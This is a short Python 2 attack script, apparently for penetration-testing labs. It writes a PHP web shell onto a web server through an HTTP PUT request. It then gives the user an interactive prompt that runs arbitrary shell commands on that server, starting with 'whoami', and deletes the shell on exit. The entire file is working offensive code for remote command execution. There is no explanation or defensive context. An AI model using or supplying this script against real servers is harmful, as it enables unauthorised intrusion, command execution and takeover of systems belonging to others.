import requests
import urllib2
import sys

def fakecmd(url, command):
    r = requests.put(url + "fakeshell.php", data="<?php echo shell_exec('" + command + "');?>")
    if r.status_code == 404:
        print "Error: Directory not found/Failed HTTP method 'PUT'"
        return "Err"
    else:
        return urllib2.urlopen(url + "fakeshell.php").read()

if len(sys.argv) != 2:
    print "------------------------------------------------------------"
    print "        Fake HTTP PUT Shell To Make Our Lives Easier        "
    print "------------------------------------------------------------"
    print "Usage: python fakeshell.py <URL>"
    print "Example: python fakeshell.py http://192.168.209.161/test"
    print ""
    sys.exit(0)

url = sys.argv[1]

if not url.endswith("/"):
    url = url + "/"

if not url.startswith("http://"):
    url = "http://" + url

output = fakecmd(url, "whoami")
if output != "Err":
    print "Got User " + output
    while output != "Err":
        inp = raw_input("> ")
        if inp != "exit":
            output = fakecmd(url, inp)
            print output
        else:
            r = requests.delete(url + "fakeshell.php")
            sys.exit(0)
    


